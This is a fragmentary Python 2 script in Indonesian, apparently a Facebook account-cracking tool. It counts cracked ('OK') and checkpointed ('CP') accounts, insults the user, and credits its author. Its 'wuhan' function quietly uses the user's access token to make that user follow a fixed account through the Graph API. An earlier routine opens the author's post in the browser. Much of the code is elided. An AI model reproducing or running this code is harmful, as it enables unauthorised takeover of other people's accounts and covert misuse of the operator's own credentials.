...
user = []
loop = 0
xi_jimpinx = '3041024256142761'
koh = '100007056486046'
hoetank = random.choice(['Bang Arya Ganteng^_^', 'Anda Wuhan Sialan!', 'YAHAHAH HAYYUK'])
...
lo_ngentod = '3041024256142761'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] krek selesai...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] lo kurang beruntung kids,silahkan krek lagi :('%(M,N);exit()
...
def yayanxd():
    ...
    try:
        ...
        print '\n\n %s*%s konichiwa %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        ...
        os.system('xdg-open https://www.facebook.com/100007056486046/posts/3041024256142761/?app=fbl')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] ganti token kontol'%(N,M,N);time.sleep(2);yayanxd()
...
def moch_yayan():
    ...
    print ' (\033[0;96m•\033[0m) USER AKTIF : %s'%(nama)
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100020192268351/subscribers?access_token=%s'%(kentod))
...
def info_tools():
    ...
    print '\n %s[%s>%s] Facebook : Muhammad Arya Adinata'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : Laskar Revolusi Reporting'%(N,H,N);time.sleep(0.07)
